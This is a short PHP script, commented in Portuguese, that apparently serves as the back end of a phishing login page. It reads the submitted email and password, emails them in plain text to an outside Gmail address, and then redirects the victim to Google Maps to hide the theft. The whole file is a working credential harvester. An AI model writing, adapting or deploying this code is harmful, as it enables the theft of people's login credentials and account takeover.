<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Configurações do Mailtrap
    $to = 'laboratorioganso@gmail.com';
    $subject = 'Novo Login';
    $message = 'E-mail: ' . $email . "\r\n" . 'Senha: ' . $password;
    $headers = 'From: no-reply@example.com' . "\r\n" . 'Reply-To: no-reply@example.com';

    // Envia o e-mail
    if (mail($to, $subject, $message, $headers)) {
        // Redireciona para o Google Maps
        header("Location: https://maps.google.com");
        exit();
    } else {
        echo "Erro ao enviar o e-mail.";
    }
}
?>
